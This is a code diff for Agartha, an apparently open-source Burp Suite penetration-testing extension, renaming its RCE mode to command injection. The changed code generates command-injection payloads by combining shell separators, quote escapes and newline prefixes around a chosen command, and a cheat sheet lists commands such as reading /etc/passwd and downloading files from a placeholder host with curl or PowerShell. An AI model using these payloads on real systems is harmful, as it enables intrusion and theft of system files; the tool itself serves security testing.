@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.56"
+VERSION = "0.57"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -24,7 +24,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
         self._callbacks.setExtensionName("Agartha {LFI|RCE|Auth|SQLi|Http-Js}")
-        print "Version " + VERSION + " is just loaded.\n\nAgartha is a security tool for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Access Matrix,\n\t\t* SQL Injection Wordlists,\n\t\t* Http Request to Javascript.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
+        print "Version " + VERSION + " is just loaded.\n\nAgartha is a security tool for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Code Injection/Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Access Matrix,\n\t\t* SQL Injection Wordlists,\n\t\t* Http Request to Javascript.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
         self._MainTabs = JTabbedPane()
         self._tabDictUI()
         self._tabAuthUI()
@@ -236,8 +236,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             if self._rbDictLFI.isSelected():
                 self._lblStatusLabel.setText("File "+ self._lblStatusLabel.text + self._txtDefaultLFI)
                 self._txtTargetPath.setText("etc/passwd")
-            elif self._rbDictRCE.isSelected():
-                self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultRCE)
+            elif self._rbDictCommandInj.isSelected():
+                self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultCommandInj)
                 self._txtTargetPath.setText("sleep 1000")
             return 
 
@@ -245,8 +245,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtTargetPath.text = self._txtTargetPath.text.strip()
         self._tabDictResultDisplay.setText("")
         self._lblStatusLabel.setText("")
-        if self._rbDictRCE.isSelected():
-            self.funcRCE(self)
+        if self._rbDictCommandInj.isSelected():
+            self.funcCommandInj(self)
         if self._rbDictLFI.isSelected():
             self.funcLFI(self)
         if self._rbDictSQLi.isSelected():
@@ -267,7 +267,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._lblStatusLabel.setForeground (Color.black)
         self._lblStatusLabel.setText("")
         self._tabDictPanel_LFI.setVisible(False)
-        self._cbDictRCEOpt.setVisible(False)
+        self._cbDictCommandInjOpt.setVisible(False)
         self._tabDictPanel_SQLType.setVisible(False)
         self._tabDictPanel_SQLi.setVisible(False)
         self._tabDictPanel_SQLOptions.setVisible(False)
@@ -276,10 +276,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
             self._tabDictPanel_LFI.setVisible(True)
             self._lblStatusLabel.setText("Please provide a path to generate payloads!")
-        elif self._rbDictRCE.isSelected():
-            self._txtTargetPath.setText(self._txtDefaultRCE)
-            self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
-            self._cbDictRCEOpt.setVisible(True)
+        elif self._rbDictCommandInj.isSelected():
+            self._txtTargetPath.setText(self._txtDefaultCommandInj)
+            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
+            self._cbDictCommandInjOpt.setVisible(True)
             self._lblStatusLabel.setText("Please provide a command to generate payloads!")
         elif self._rbDictSQLi.isSelected():
             self._txtTargetPath.setText(self._txtDefaultSQLi)
@@ -289,8 +289,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self.funcSQLi(self)
         return
 
-    def funcRCE(self, ev):
-        listRCE = []        
+    def funcCommandInj(self, ev):
+        listCommandInj = []        
         prefixes = ["", "\\n", "\\r\\n", "%0a", "%0d%0a"]
         escapeChars = ["",  "'", "\\'", "\"", "\\\""]
         separators = ["&", "&&", "|", "||", ";"]
@@ -300,28 +300,28 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             for escapeChar in escapeChars:
                 for separator in separators:
                     for suffix in suffixes:
-                        listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
-                        listRCE.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
+                        listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
+                        listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                         if escapeChar:
-                            listRCE.append(prefix + separator + self._txtTargetPath.text + escapeChar + suffix + "\n")
-                            listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + suffix + "\n")
+                            listCommandInj.append(prefix + separator + self._txtTargetPath.text + escapeChar + suffix + "\n")
+                            listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + suffix + "\n")
                         if suffix != " ::":
-                            listRCE.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")                            
-                            listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
+                            listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")                            
+                            listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                             if escapeChar:    
-                                listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + suffix + "\n")
-                                listRCE.append(prefix + "`" + self._txtTargetPath.text + "`" + escapeChar + suffix + "\n")
-                        listRCE.append(prefix + self._txtTargetPath.text + "\n")
-                    listRCE.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")            
-            listRCE.append(prefix + self._txtTargetPath.text + "\n")
-            listRCE.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")
+                                listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + suffix + "\n")
+                                listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + escapeChar + suffix + "\n")
+                        listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
+                    listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")            
+            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
+            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")
 
-        listRCE = list(set(listRCE))
-        listRCE.sort(reverse=True)
-        if self._cbDictRCEEncoding.isSelected():
-            listRCE = self.encodeURL(listRCE)
-        self._tabDictResultDisplay.setText(''.join(map(str, listRCE)))
-        self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtTargetPath.text + '", with '+ str(len(listRCE)) + ' result.')
+        listCommandInj = list(set(listCommandInj))
+        listCommandInj.sort(reverse=True)
+        if self._cbDictCommandInjEncoding.isSelected():
+            listCommandInj = self.encodeURL(listCommandInj)
+        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
+        self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtTargetPath.text + '", with '+ str(len(listCommandInj)) + ' result.')
         return
 
     def funcLFI(self, ev):
@@ -834,7 +834,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
     def _tabDictUI(self):
         #top panel
         self._txtDefaultLFI = "Example: 'etc/passwd', 'C:\\boot.ini'"
-        self._txtDefaultRCE = "Examples: $'sleep 1000', >'timeout 1000'"
+        self._txtDefaultCommandInj = "Examples: $'sleep 1000', >'timeout 1000'"
         self._txtDefaultSQLi = "No input is needed to supply!"
         self._txtCheatSheetLFI = ""
         self._txtCheatSheetLFI += "Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
@@ -847,30 +847,30 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetLFI += "\t/etc/group\t\t\t\t\tC:\users\public\desktop\desktop.ini\n"
         self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\t\tC:\windows\system32\eula.txt\n"
         self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\t\tC:\windows\system32\license.rtf\n"
-        self._txtCheatSheetRCE = ""
-        self._txtCheatSheetRCE += "RCE Linux\t\t\t\t\tRCE Windows\n"
-        self._txtCheatSheetRCE += "\tcat /etc/passwd\t\t\t\tcmd.exe?/c type file.txt\n"
-        self._txtCheatSheetRCE += "\tuname -a\t\t\t\t\tsysteminfo\n"
-        self._txtCheatSheetRCE += "\t/usr/bin/id\t\t\t\t\twhoami /priv\n"
-        self._txtCheatSheetRCE += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
-        self._txtCheatSheetRCE += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"       
+        self._txtCheatSheetCommandInj = ""
+        self._txtCheatSheetCommandInj += "Command Inj Unix\t\t\t\t\tCommand Inj Windows\n"
+        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\t\tcmd.exe?/c type file.txt\n"
+        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\t\tsysteminfo\n"
+        self._txtCheatSheetCommandInj += "\t/usr/bin/id\t\t\t\t\t\twhoami /priv\n"
+        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\t\tping -n 10 X.X.X.X\n"
+        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"       
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
         self._lblStatusLabel = JLabel()
         self._lblStatusLabel.setText("Please provide a path for payload generation!")
         self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
         self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
-        self._rbDictRCE = JRadioButton('RCE', itemStateChanged=self.funcRBSelection)
+        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
         self._rbDictSQLi = JRadioButton('SQLi', itemStateChanged=self.funcRBSelection)
         _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
         _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
         _rbPanel = JPanel()
         _rbPanel.add(self._rbDictLFI)
-        _rbPanel.add(self._rbDictRCE)
+        _rbPanel.add(self._rbDictCommandInj)
         _rbPanel.add(self._rbDictSQLi)
         _rbGroup = ButtonGroup()
         _rbGroup.add(self._rbDictLFI)
-        _rbGroup.add(self._rbDictRCE)
+        _rbGroup.add(self._rbDictCommandInj)
         _rbGroup.add(self._rbDictSQLi)
         _rbGroup.add(_rbDictCheatSheet)
         _rbGroup.add(_rbDictFuzzer)
@@ -880,10 +880,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbDictDepth.setSelectedIndex(5)
         _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         _cbDictDepthPanel.add(self._cbDictDepth)
-        self._cbDictRCEEncoding = JCheckBox('URL Encoding', False)
-        self._cbDictRCEOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
-        self._cbDictRCEOpt.add(self._cbDictRCEEncoding)
-        self._cbDictRCEOpt.setVisible(False)
+        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
+        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
+        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
+        self._cbDictCommandInjOpt.setVisible(False)
         self._cbStackedSQL = JCheckBox('Stacked Queries', False)
         self._cbTimeBased = JCheckBox('Time-Based', True)
         self._cbUnionBased = JCheckBox('Union-Based', False)
@@ -929,7 +929,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabDictPanel_SQLi.add(self._cbOrderDepth, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.setVisible(False)
         _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
-        _tabDictPanel_1.add(self._cbDictRCEOpt, BorderLayout.PAGE_START)
+        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
